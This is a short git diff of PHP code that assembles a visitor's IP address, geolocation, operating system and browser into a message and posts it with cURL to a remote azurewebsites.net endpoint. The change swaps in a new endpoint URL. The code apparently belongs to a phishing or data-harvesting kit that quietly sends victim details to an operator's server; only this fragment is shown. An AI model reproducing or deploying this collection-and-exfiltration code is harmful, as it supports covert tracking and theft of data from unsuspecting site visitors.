@@ -12,20 +12,20 @@ Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
 SO: ' . $user_os . '
 Navegador: ' . $navegador . '';
   $payload = ['mensaje' => $message];
-  $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/pses/';
+  $url = 'https://serivihtn-fdg4e4ffc9gaf0f8.francecentral-01.azurewebsites.net/psess';
 
   $ch = curl_init($url);
   curl_setopt_array($ch, [
     CURLOPT_RETURNTRANSFER => true,
     CURLOPT_POST           => true,
     CURLOPT_HTTPHEADER     => [
-      'X-Client-IP: ' . $myip,
+      'Accept: application/json',
+
     ],
-    CURLOPT_POSTFIELDS     => $payload, // Aquí $payload debe ser un array asociativo
+    CURLOPT_POSTFIELDS     => $payload,
     CURLOPT_TIMEOUT        => 20,
     CURLOPT_CONNECTTIMEOUT => 10,
   ]);
-
 
   $response = curl_exec($ch);
   if ($response === false) {
